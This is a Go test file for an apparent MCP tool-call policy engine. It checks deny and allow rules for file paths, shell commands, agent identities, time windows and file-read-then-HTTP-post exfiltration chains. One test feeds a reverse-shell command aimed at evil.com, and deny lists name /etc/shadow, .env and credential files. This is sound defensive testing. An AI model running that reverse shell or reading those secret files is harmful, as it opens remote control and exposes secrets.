package policy_test

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/themayursinha/mcp-visor/internal/mcp"
	"github.com/themayursinha/mcp-visor/internal/policy"
)

func TestDefaultPolicyDenyUnknown(t *testing.T) {
	p := policy.DefaultPolicy()
	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "some_unknown_tool",
		Arguments: json.RawMessage(`{}`),
	}

	decision := eng.Evaluate("unknown-server", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("expected deny for unknown tool, got %s", decision.Action)
	}
}

func TestDefaultPolicyAllowWhenConfigured(t *testing.T) {
	p := policy.DefaultPolicy()
	p.DefaultAction = policy.ActionAllow

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "some_tool",
		Arguments: json.RawMessage(`{}`),
	}

	decision := eng.Evaluate("unknown-server", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("expected allow with default-allow policy, got %s", decision.Action)
	}
}

func TestLoadPolicyWithServers(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "filesystem"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
        rules:
          - type: deny_path
            patterns:
              - "/etc/passwd"
              - "**/.env"
          - type: allow_path
            patterns:
              - "/home/**"
      - name: "shell_exec"
        allowed: false
  - name: "github"
    allowed: true
    tools:
      - name: "github_read"
        allowed: true
        risk: low
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "file_read",
		Arguments: json.RawMessage(`{"path": "/home/user/project/readme.md"}`),
	}
	decision := eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("expected allow, got %s: %s", decision.Action, decision.Reason)
	}

	req = mcp.ToolsCallRequest{
		Name:      "shell_exec",
		Arguments: json.RawMessage(`{}`),
	}
	decision = eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("expected deny for shell_exec, got %s", decision.Action)
	}

	req = mcp.ToolsCallRequest{
		Name:      "file_read",
		Arguments: json.RawMessage(`{"path": "/etc/passwd"}`),
	}
	decision = eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("expected deny for /etc/passwd, got %s: %s", decision.Action, decision.Reason)
	}
}

func TestDenyPathPatterns(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "filesystem"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
        rules:
          - type: deny_path
            patterns:
              - "/etc/passwd"
              - "/etc/shadow"
              - "**/.env"
              - "**/credentials*"
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	tests := []struct {
		path     string
		expected policy.Action
	}{
		{"/etc/passwd", policy.ActionDeny},
		{"/etc/shadow", policy.ActionDeny},
		{"/home/user/.env", policy.ActionDeny},
		{"/project/credentials.yml", policy.ActionDeny},
		{"/home/user/project/file.txt", policy.ActionAllow},
		{"/tmp/test.txt", policy.ActionAllow},
	}

	for _, tt := range tests {
		req := mcp.ToolsCallRequest{
			Name:      "file_read",
			Arguments: mustMarshal(map[string]string{"path": tt.path}),
		}
		decision := eng.Evaluate("filesystem", req)
		if decision.Action != tt.expected {
			t.Errorf("path=%q: expected %s, got %s (%s)", tt.path, tt.expected, decision.Action, decision.Reason)
		}
	}
}

func TestAllowPathPatterns(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "filesystem"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        rules:
          - type: allow_path
            patterns:
              - "/home/**"
              - "/tmp/mcp/**"
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	allowedPaths := []string{"/home/user/file.txt", "/tmp/mcp/data.csv"}
	deniedPaths := []string{"/etc/passwd", "/var/log/syslog", "/root/.bashrc"}

	for _, path := range allowedPaths {
		req := mcp.ToolsCallRequest{
			Name:      "file_read",
			Arguments: mustMarshal(map[string]string{"path": path}),
		}
		decision := eng.Evaluate("filesystem", req)
		if decision.Action != policy.ActionAllow {
			t.Errorf("path=%q: expected allow, got %s (%s)", path, decision.Action, decision.Reason)
		}
	}

	for _, path := range deniedPaths {
		req := mcp.ToolsCallRequest{
			Name:      "file_read",
			Arguments: mustMarshal(map[string]string{"path": path}),
		}
		decision := eng.Evaluate("filesystem", req)
		if decision.Action != policy.ActionDeny {
			t.Errorf("path=%q: expected deny, got %s (%s)", path, string(decision.Action), decision.Reason)
		}
	}
}

func TestRiskClassification(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "test-server"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
      - name: "shell_exec"
        allowed: true
        risk: critical
      - name: "github_read"
        allowed: true
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	if r := eng.GetRiskLevel("test-server", "file_read"); r != policy.RiskMedium {
		t.Errorf("expected medium risk, got %s", r)
	}
	if r := eng.GetRiskLevel("test-server", "shell_exec"); r != policy.RiskCritical {
		t.Errorf("expected critical risk, got %s", r)
	}
	if r := eng.GetRiskLevel("test-server", "github_read"); r != policy.RiskMedium {
		t.Errorf("expected medium risk for github_read, got %s", r)
	}
	if r := eng.GetRiskLevel("test-server", "unknown_tool"); r != policy.RiskLow {
		t.Errorf("expected low risk for unknown_tool, got %s", r)
	}
}

func TestInferredRiskClassification(t *testing.T) {
	eng := policy.NewEngine(policy.DefaultPolicy())

	tests := []struct {
		toolName string
		expected policy.RiskLevel
	}{
		{"database_delete", policy.RiskCritical},
		{"aws_iam_create_user", policy.RiskCritical},
		{"shell_exec", policy.RiskCritical},
		{"file_write", policy.RiskHigh},
		{"slack_send_message", policy.RiskHigh},
		{"http_post", policy.RiskHigh},
		{"database_query", policy.RiskHigh},
		{"file_read", policy.RiskMedium},
		{"github_read_code", policy.RiskMedium},
		{"web_search", policy.RiskMedium},
		{"list_files", policy.RiskLow},
		{"get_status", policy.RiskMedium},
	}

	for _, tt := range tests {
		risk := eng.GetRiskLevel("any-server", tt.toolName)
		if risk != tt.expected {
			t.Errorf("tool=%q: expected %s, got %s", tt.toolName, tt.expected, risk)
		}
	}
}

func TestApprovalRequired(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "test-server"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
      - name: "slack_send"
        allowed: true
        risk: high
        approval_required: true
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{Name: "file_read"}
	if eng.EvaluateApproval("test-server", req) {
		t.Error("file_read should not require approval")
	}
	req = mcp.ToolsCallRequest{Name: "slack_send"}
	if !eng.EvaluateApproval("test-server", req) {
		t.Error("slack_send should require approval")
	}

	decision := eng.Evaluate("test-server", req)
	if decision.Action != policy.ActionRequireApproval {
		t.Errorf("approval_required tool should return require_approval, got %s", decision.Action)
	}
}

func TestRegistryLookups(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "srv1"
    allowed: true
    tools:
      - name: "tool_a"
        allowed: true
      - name: "tool_b"
        allowed: false
  - name: "srv2"
    allowed: false
    tools:
      - name: "tool_c"
        allowed: true
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)
	reg := eng.Registry()

	srv, ok := reg.Server("srv1")
	if !ok || srv == nil {
		t.Fatal("srv1 not found")
	}
	if !srv.Allowed {
		t.Error("srv1 should be allowed")
	}

	srv, ok = reg.Server("srv2")
	if !ok || srv == nil {
		t.Fatal("srv2 not found")
	}
	if srv.Allowed {
		t.Error("srv2 should not be allowed")
	}

	allowed, known := reg.IsToolAllowed("srv1", "tool_a")
	if !known || !allowed {
		t.Error("tool_a should be known and allowed")
	}

	allowed, known = reg.IsToolAllowed("srv1", "tool_b")
	if !known || allowed {
		t.Error("tool_b should be known but denied")
	}

	allowed, known = reg.IsToolAllowed("srv1", "nonexistent")
	if known {
		t.Error("nonexistent should not be known")
	}
	if allowed {
		t.Error("nonexistent should not be allowed in default-deny")
	}
}

func TestServerDenied(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "blocked-server"
    allowed: false
    tools:
      - name: "tool_a"
        allowed: true
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{Name: "tool_a"}
	decision := eng.Evaluate("blocked-server", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("expected deny for blocked server, got %s", decision.Action)
	}
}

func TestCommandDenyPattern(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "shell"
    allowed: true
    tools:
      - name: "shell_exec"
        allowed: true
        rules:
          - type: deny_command_pattern
            patterns:
              - "bash.*-i.*>&"
              - "rm\\s+-rf\\s+/"
          - type: allow_command_pattern
            patterns:
              - "^ls\\s"
              - "^git\\s"
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "shell_exec",
		Arguments: mustMarshal(map[string]string{"command": "bash -i >& /dev/tcp/evil.com/4444 0>&1"}),
	}
	decision := eng.Evaluate("shell", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("expected deny for reverse shell, got %s", decision.Action)
	}

	req = mcp.ToolsCallRequest{
		Name:      "shell_exec",
		Arguments: mustMarshal(map[string]string{"command": "ls -la"}),
	}
	decision = eng.Evaluate("shell", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("expected allow for ls, got %s: %s", decision.Action, decision.Reason)
	}
}

func TestLoadInvalidPolicy(t *testing.T) {
	_, err := policy.Load([]byte(`this is not yaml: [[[`))
	if err == nil {
		t.Error("expected error for invalid YAML")
	}
}

func TestLoadPolicyValidation(t *testing.T) {
	_, err := policy.Load([]byte(`
version: "1.0"
default_action: invalid_action
servers: []
`))
	if err == nil {
		t.Error("expected validation error for invalid default_action")
	}
}

func TestChainRuleMatching(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
tool_chains:
  - name: "prevent_exfil"
    sources:
      - server: "*"
        tool_pattern: "file_read"
    sinks:
      - server: "*"
        tool_pattern: "http_post"
    action: deny
    within_calls: 3
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	previousCalls := []string{"filesystem:file_read", "filesystem:list"}

	req := mcp.ToolsCallRequest{Name: "http_post"}
	decision := eng.EvaluateChain("web-server", req, previousCalls)

	if decision.Action != policy.ActionDeny {
		t.Errorf("expected deny for file_read→http_post chain, got %s", decision.Action)
	}
}

func TestChainRuleNoMatch(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
tool_chains:
  - name: "prevent_exfil"
    sources:
      - server: "*"
        tool_pattern: "file_read"
    sinks:
      - server: "*"
        tool_pattern: "http_post"
    action: deny
    within_calls: 3
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	previousCalls := []string{"filesystem:file_read", "filesystem:file_read"}

	req := mcp.ToolsCallRequest{Name: "file_read"}
	decision := eng.EvaluateChain("filesystem", req, previousCalls)

	if decision.Action != policy.ActionAllow {
		t.Errorf("expected allow (sink not http_post), got %s", decision.Action)
	}
}

func mustMarshal(v any) json.RawMessage {
	data, _ := json.Marshal(v)
	return data
}

func TestIdentityPolicyEnforcement(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "filesystem"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
      - name: "file_write"
        allowed: true
        risk: high
  - name: "github"
    allowed: true
    tools:
      - name: "github_read_code"
        allowed: true
        risk: low
      - name: "github_create_pr"
        allowed: true
        risk: medium
identities:
  - name: "copilot-dev"
    description: "Standard developer agent"
    allowed_servers:
      - "filesystem"
      - "github"
    allowed_tools:
      - "filesystem/file_read"
      - "github/github_read_code"
      - "github/github_create_pr"
  - name: "readonly-agent"
    description: "Read-only agent"
    allowed_servers:
      - "filesystem"
    allowed_tools:
      - "filesystem/file_read"
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)
	eng.SetClientID("copilot-dev")

	req := mcp.ToolsCallRequest{
		Name:      "file_read",
		Arguments: json.RawMessage(`{"path": "/home/user/file.txt"}`),
	}
	decision := eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("copilot-dev should be allowed file_read, got %s: %s", decision.Action, decision.Reason)
	}

	req = mcp.ToolsCallRequest{
		Name:      "github_create_pr",
		Arguments: json.RawMessage(`{}`),
	}
	decision = eng.Evaluate("github", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("copilot-dev should be allowed github_create_pr, got %s: %s", decision.Action, decision.Reason)
	}

	req = mcp.ToolsCallRequest{
		Name:      "file_write",
		Arguments: json.RawMessage(`{"path": "/home/user/file.txt"}`),
	}
	decision = eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("copilot-dev should NOT be allowed file_write, got %s", decision.Action)
	}
}

func TestIdentityPolicyNoMatch(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "filesystem"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
identities:
  - name: "copilot-dev"
    allowed_servers:
      - "github"
    allowed_tools:
      - "github/github_read_code"
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)
	eng.SetClientID("unknown-agent")

	req := mcp.ToolsCallRequest{
		Name:      "file_read",
		Arguments: json.RawMessage(`{"path": "/home/user/file.txt"}`),
	}
	decision := eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("unknown agent should be denied, got %s", decision.Action)
	}
}

func TestIdentityPolicyReadonlyAgent(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "filesystem"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
      - name: "file_write"
        allowed: true
identities:
  - name: "readonly-agent"
    allowed_servers:
      - "filesystem"
    allowed_tools:
      - "filesystem/file_read"
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)
	eng.SetClientID("readonly-agent")

	req := mcp.ToolsCallRequest{
		Name:      "file_read",
		Arguments: json.RawMessage(`{"path": "/tmp/test.txt"}`),
	}
	decision := eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("readonly-agent should be allowed file_read, got %s", decision.Action)
	}

	req = mcp.ToolsCallRequest{
		Name:      "file_write",
		Arguments: json.RawMessage(`{"path": "/tmp/test.txt"}`),
	}
	decision = eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("readonly-agent should be denied file_write, got %s", decision.Action)
	}
}

func TestNoIdentitiesNoRestriction(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "filesystem"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
      - name: "file_write"
        allowed: true
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)
	eng.SetClientID("any-agent")

	req := mcp.ToolsCallRequest{
		Name:      "file_write",
		Arguments: json.RawMessage(`{"path": "/tmp/test.txt"}`),
	}
	decision := eng.Evaluate("filesystem", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("no identities configured should allow all, got %s", decision.Action)
	}
}

func TestTimeRestrictionDeniedDays(t *testing.T) {
	currentDay := time.Now().Weekday().String()

	yaml := fmt.Sprintf(`
version: "1.0"
default_action: deny
servers:
  - name: "shell"
    allowed: true
    tools:
      - name: "shell_exec"
        allowed: true
time_restrictions:
  - name: "no_shell_today"
    servers: ["shell"]
    tools: ["shell_exec"]
    denied_days: ["%s"]
    outside_action: deny
`, strings.ToLower(currentDay))

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "shell_exec",
		Arguments: json.RawMessage(`{"command": "ls"}`),
	}
	decision := eng.Evaluate("shell", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("shell_exec on denied day should be denied, got %s", decision.Action)
	}
}

func TestTimeRestrictionAllowedDay(t *testing.T) {
	currentDay := time.Now().Weekday().String()

	deniedDays := []string{}
	for _, d := range []string{"monday", "tuesday", "wednesday", "thursday", "friday", "saturday", "sunday"} {
		if d != strings.ToLower(currentDay) {
			deniedDays = append(deniedDays, d)
		}
	}
	deniedStr := ""
	for _, d := range deniedDays {
		deniedStr += fmt.Sprintf(`      - "%s"`+"\n", d)
	}

	yaml := fmt.Sprintf(`
version: "1.0"
default_action: deny
servers:
  - name: "shell"
    allowed: true
    tools:
      - name: "shell_exec"
        allowed: true
time_restrictions:
  - name: "allowed_only_today"
    servers: ["shell"]
    tools: ["shell_exec"]
    denied_days:
%s
    outside_action: deny
`, deniedStr)

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "shell_exec",
		Arguments: json.RawMessage(`{"command": "ls"}`),
	}
	decision := eng.Evaluate("shell", req)
	if decision.Action != policy.ActionAllow {
		t.Errorf("shell_exec on allowed day should be allowed, got %s: %s", decision.Action, decision.Reason)
	}
}

func TestTimeRestrictionAllowedHoursOutside(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "shell"
    allowed: true
    tools:
      - name: "shell_exec"
        allowed: true
time_restrictions:
  - name: "business_hours_only"
    servers: ["shell"]
    tools: ["shell_exec"]
    allowed_hours:
      - start: "03:00"
        end: "03:01"
        timezone: "UTC"
    outside_action: deny
`

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "shell_exec",
		Arguments: json.RawMessage(`{"command": "ls"}`),
	}
	decision := eng.Evaluate("shell", req)
	if decision.Action != policy.ActionDeny {
		t.Errorf("shell_exec outside 1-minute window should be denied, got %s", decision.Action)
	}
}

func TestTimeRestrictionApprovalAction(t *testing.T) {
	currentDay := time.Now().Weekday().String()

	yaml := fmt.Sprintf(`
version: "1.0"
default_action: deny
servers:
  - name: "shell"
    allowed: true
    tools:
      - name: "shell_exec"
        allowed: true
time_restrictions:
  - name: "shell_weekend_approval"
    servers: ["shell"]
    tools: ["shell_exec"]
    denied_days: ["%s"]
    outside_action: require_approval
`, strings.ToLower(currentDay))

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	req := mcp.ToolsCallRequest{
		Name:      "shell_exec",
		Arguments: json.RawMessage(`{"command": "ls"}`),
	}
	decision := eng.Evaluate("shell", req)
	if decision.Action != policy.ActionRequireApproval {
		t.Errorf("shell_exec on denied day should require approval, got %s", decision.Action)
	}
}

func TestTimeRestrictionToolWildcard(t *testing.T) {
	currentDay := time.Now().Weekday().String()

	yaml := fmt.Sprintf(`
version: "1.0"
default_action: deny
servers:
  - name: "cloud"
    allowed: true
    tools:
      - name: "aws_iam_create_user"
        allowed: true
      - name: "aws_iam_attach_policy"
        allowed: true
time_restrictions:
  - name: "no_iam_on_weekend"
    servers: ["cloud"]
    tools: ["aws_iam_*"]
    denied_days: ["%s"]
    outside_action: deny
`, strings.ToLower(currentDay))

	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load policy: %v", err)
	}

	eng := policy.NewEngine(p)

	for _, tool := range []string{"aws_iam_create_user", "aws_iam_attach_policy"} {
		req := mcp.ToolsCallRequest{
			Name:      tool,
			Arguments: json.RawMessage(`{}`),
		}
		decision := eng.Evaluate("cloud", req)
		if decision.Action != policy.ActionDeny {
			t.Errorf("%s on denied day should be denied with wildcard, got %s", tool, decision.Action)
		}
	}
}
